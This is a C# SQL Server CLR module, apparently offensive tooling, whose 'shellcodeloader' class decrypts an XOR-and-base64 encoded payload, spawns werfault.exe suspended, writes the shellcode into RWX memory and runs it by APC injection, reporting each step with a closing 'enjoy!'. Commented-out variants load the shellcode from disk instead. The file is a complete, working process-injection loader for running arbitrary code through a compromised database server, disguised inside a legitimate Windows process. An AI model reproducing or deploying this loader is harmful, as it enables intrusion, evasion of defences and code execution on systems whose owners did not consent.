using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.SqlServer.Server;

namespace CLR_module;

internal class shellcodeloader
{
	public enum ProcessAccessRights
	{
		All = 2035711,
		Terminate = 1,
		CreateThread = 2,
		VirtualMemoryOperation = 8,
		VirtualMemoryRead = 16,
		VirtualMemoryWrite = 32,
		DuplicateHandle = 64,
		CreateProcess = 128,
		SetQuota = 256,
		SetInformation = 512,
		QueryInformation = 1024,
		QueryLimitedInformation = 4096,
		Synchronize = 1048576
	}

	public enum ThreadAccess
	{
		TERMINATE = 1,
		SUSPEND_RESUME = 2,
		GET_CONTEXT = 8,
		SET_CONTEXT = 16,
		SET_INFORMATION = 32,
		QUERY_INFORMATION = 64,
		SET_THREAD_TOKEN = 128,
		IMPERSONATE = 256,
		DIRECT_IMPERSONATION = 512,
		THREAD_HIJACK = 26,
		THREAD_ALL = 1019
	}

	public enum MemAllocation
	{
		MEM_COMMIT = 0x1000,
		MEM_RESERVE = 0x2000,
		MEM_RESET = 0x80000,
		MEM_RESET_UNDO = 0x1000000,
		SecCommit = 0x8000000
	}

	public enum MemProtect
	{
		PAGE_EXECUTE = 16,
		PAGE_EXECUTE_READ = 32,
		PAGE_EXECUTE_READWRITE = 64,
		PAGE_EXECUTE_WRITECOPY = 128,
		PAGE_NOACCESS = 1,
		PAGE_READONLY = 2,
		PAGE_READWRITE = 4,
		PAGE_WRITECOPY = 8,
		PAGE_TARGETS_INVALID = 1073741824,
		PAGE_TARGETS_NO_UPDATE = 1073741824
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	//internal struct PROCESS_BASIC_INFORMATION
	//{
	//	public IntPtr Reserved1;

	//	public IntPtr PebAddress;

	//	public IntPtr Reserved2;

	//	public IntPtr Reserved3;

	//	public IntPtr UniquePid;

	//	public IntPtr MoreReserved;
	//}

	public struct STARTUPINFO
	{
		private uint cb;

		private IntPtr lpReserved;

		private IntPtr lpDesktop;

		private IntPtr lpTitle;

		private uint dwX;

		private uint dwY;

		private uint dwXSize;

		private uint dwYSize;

		private uint dwXCountChars;

		private uint dwYCountChars;

		private uint dwFillAttributes;

		public uint dwFlags;

		public ushort wShowWindow;

		private ushort cbReserved;

		private IntPtr lpReserved2;

		private IntPtr hStdInput;

		private IntPtr hStdOutput;

		private IntPtr hStdErr;
	}

	[DllImport("Kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("Kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("Kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern uint ResumeThread(IntPtr hThread);

	[DllImport("Kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hObject);

	[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

	public static PROCESS_INFORMATION StartProcess(string binaryPath)
	{
		uint dwCreateFlags = 4u;
		STARTUPINFO lpStartinfo = default(STARTUPINFO);
		PROCESS_INFORMATION lpProcInformation = default(PROCESS_INFORMATION);
		CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, bInheritHandles: false, dwCreateFlags, (IntPtr)0, (IntPtr)0, ref lpStartinfo, out lpProcInformation);
		return lpProcInformation;
	}

	public static byte[] X0r(byte[] cipher, byte[] key)
	{
		byte[] array = new byte[cipher.Length];
		for (int i = 0; i < cipher.Length; i++)
		{
			array[i] = (byte)(cipher[i] ^ key[i % key.Length]);
		}
		return array;
	}

    private static bool is64Bit()
    {
        if (IntPtr.Size == 4)
            return false;

        return true;
    }

    public static void run(string code, string xor_key)
    {
		try
		{
			if (is64Bit())
			{
                SqlContext.Pipe.Send(String.Format("[+] X64."));
			}
			else
			{
                SqlContext.Pipe.Send(String.Format("[+] X86."));
            }
            SqlContext.Pipe.Send(String.Format("[+] Decrypting XOR encrypted binary using key '{0}'", xor_key));
            byte[] cipher = Convert.FromBase64String(code);
            byte[] xorKey = Convert.FromBase64String(xor_key);
			byte[] array = null;
			array = X0r(cipher, xorKey);
			uint lpNumberOfBytesWritten = 0u;
			PROCESS_INFORMATION pROCESS_INFORMATION = StartProcess("C:/Windows/System32/werfault.exe");
			SqlContext.Pipe.Send("[+] StartProcess werfault.exe");
			IntPtr intPtr = OpenProcess(2035711u, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwProcessId);
			SqlContext.Pipe.Send($"[+] OpenProcess Pid: {pROCESS_INFORMATION.dwProcessId.ToString()}");
			IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288u, 64u);
			SqlContext.Pipe.Send("[+] VirtualAllocEx Success");
			if (WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, ref lpNumberOfBytesWritten))
			{
				IntPtr hThread = OpenThread(ThreadAccess.THREAD_ALL, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwThreadId);
				QueueUserAPC(intPtr2, hThread, IntPtr.Zero);
				ResumeThread(hThread);
				SqlContext.Pipe.Send($"[+] QueueUserAPC Inject shellcode to PID: {pROCESS_INFORMATION.dwProcessId.ToString()} Success");
			}
			if (CloseHandle(intPtr))
			{
				SqlContext.Pipe.Send("[+] hOpenProcessClose Success");
			}
			SqlContext.Pipe.Send("\n\n[*] QueueUserAPC Inject shellcode Success, enjoy!");
		}
		catch (Exception ex)
		{
			SqlContext.Pipe.Send("[X] ERROR Log:" + ex.ToString());
		}
	}

	//	public static void run1(string file, string key)
	//	{
	//		try
	//		{
	//			SqlContext.Pipe.Send($"[+] EncryptShellcodePath: {file}");
	//			SqlContext.Pipe.Send($"[+] XorKey: {key}");
	//			string s = File.ReadAllText(file);
	//			byte[] cipher = Convert.FromBase64String(s);
	//			byte[] array = null;
	//			array = X0r(cipher, Encoding.ASCII.GetBytes(key));
	//			uint lpNumberOfBytesWritten = 0u;
	//			PROCESS_INFORMATION pROCESS_INFORMATION = StartProcess("C:/Windows/System32/werfault.exe");
	//			SqlContext.Pipe.Send("[+] StartProcess werfault.exe");
	//			IntPtr intPtr = OpenProcess(2035711u, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwProcessId);
	//			SqlContext.Pipe.Send($"[+] OpenProcess Pid: {pROCESS_INFORMATION.dwProcessId.ToString()}");
	//			IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288u, 64u);
	//			SqlContext.Pipe.Send("[+] VirtualAllocEx Success");
	//			if (WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, ref lpNumberOfBytesWritten))
	//			{
	//				IntPtr hThread = OpenThread(ThreadAccess.THREAD_ALL, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwThreadId);
	//				QueueUserAPC(intPtr2, hThread, IntPtr.Zero);
	//				ResumeThread(hThread);
	//				SqlContext.Pipe.Send($"[+] QueueUserAPC Inject shellcode to PID: {pROCESS_INFORMATION.dwProcessId.ToString()} Success");
	//			}
	//			if (CloseHandle(intPtr))
	//			{
	//				SqlContext.Pipe.Send("[+] hOpenProcessClose Success");
	//			}
	//			SqlContext.Pipe.Send("\n\n[*] QueueUserAPC Inject shellcode Success, enjoy!");
	//		}
	//		catch (Exception ex)
	//		{
	//			SqlContext.Pipe.Send("[X] ERROR Log:" + ex.ToString());
	//		}
	//	}

	//	public static void run2(string file)
	//	{
	//		try
	//		{
	//			SqlContext.Pipe.Send($"[+] ShellcodePath: {file}");
	//			byte[] array = File.ReadAllBytes(file);
	//			uint lpNumberOfBytesWritten = 0u;
	//			PROCESS_INFORMATION pROCESS_INFORMATION = StartProcess("C:/Windows/System32/werfault.exe");
	//			SqlContext.Pipe.Send("[+] StartProcess werfault.exe");
	//			IntPtr intPtr = OpenProcess(2035711u, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwProcessId);
	//			SqlContext.Pipe.Send($"[+] OpenProcess Pid: {pROCESS_INFORMATION.dwProcessId.ToString()}");
	//			IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288u, 64u);
	//			SqlContext.Pipe.Send("[+] VirtualAllocEx Success");
	//			if (WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, ref lpNumberOfBytesWritten))
	//			{
	//				IntPtr hThread = OpenThread(ThreadAccess.THREAD_ALL, bInheritHandle: false, (uint)pROCESS_INFORMATION.dwThreadId);
	//				QueueUserAPC(intPtr2, hThread, IntPtr.Zero);
	//				ResumeThread(hThread);
	//				SqlContext.Pipe.Send($"[+] QueueUserAPC Inject shellcode to PID: {pROCESS_INFORMATION.dwProcessId.ToString()} Success");
	//			}
	//			if (CloseHandle(intPtr))
	//			{
	//				SqlContext.Pipe.Send("[+] hOpenProcessClose Success");
	//			}
	//			SqlContext.Pipe.Send("\n\n[*] QueueUserAPC Inject shellcode Success, enjoy!");
	//		}
	//		catch (Exception ex)
	//		{
	//			SqlContext.Pipe.Send("[X] ERROR Log:" + ex.ToString());
	//		}
	//	}
}
